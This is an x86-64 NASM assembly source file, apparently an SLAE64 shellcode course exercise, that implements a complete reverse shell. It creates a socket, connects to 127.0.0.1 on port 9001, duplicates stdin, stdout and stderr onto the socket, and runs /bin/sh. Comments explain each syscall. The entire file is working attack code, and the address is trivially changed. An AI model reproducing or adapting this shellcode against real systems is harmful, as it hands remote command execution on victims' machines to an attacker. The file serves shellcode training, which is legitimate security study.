; Filename: reverse.nasm
; Author: SLAE64-14209

global _start

section .text

_start:

      push byte +0x29               ; = 41
      pop rax                       ; syscall = socket()
      cdq                           ; RDX = 0
      push byte +0x2                ; 
      pop rdi                       ; AF_INET = 2
      push byte +0x1                ;
      pop rsi                       ; SOCKET_STREAM = 1
      syscall                       ; executing syscall socket()
      xchg rax,rdi                  ; RDI for later use
      mov rcx,0x100007f29230002     ; 100007f = IP 127.0.0.1, 2923 = port 9001, 02 = AF_INET
      push rcx                      ; 
      mov rsi,rsp                   ; 
      push byte +0x10               ;
      pop rdx                       ; address length into RDX
      push byte +0x2a               ;
      pop rax                       ; RAX = 42
      syscall                       ; syscall = connect()
      push byte +0x3                ; 
      pop rsi                       ; RSI = 3
      dec rsi                       ; RSI minus 1 <-------<-----------<-----------<-----------<-------------<-----|
      push byte +0x21               ; = 33                                                                        |
      pop rax                       ; syscall dup2()                                                              |
      syscall                       ; executing syscall dup2()                                                    |
      jnz 0x27                      ; JNE -> loop to instruction dec rsi (redirects STDERR, STDOUT and STDIN -->->|           
      push byte +0x3b               ; = 59
      pop rax                       ; syscall execve()
      cdq                           ; RDX = 0
      mov rbx,0x68732f6e69622f      ; = "hs/nib/"
      push rbx                      ;
      mov rdi,rsp                   ; RSI -> RDI -> pathname = /bin/sh,0x0
      push rdx                      ;
      push rdi                      ;
      mov rsi,rsp                   ;
      syscall                       ; executing syscall execve()
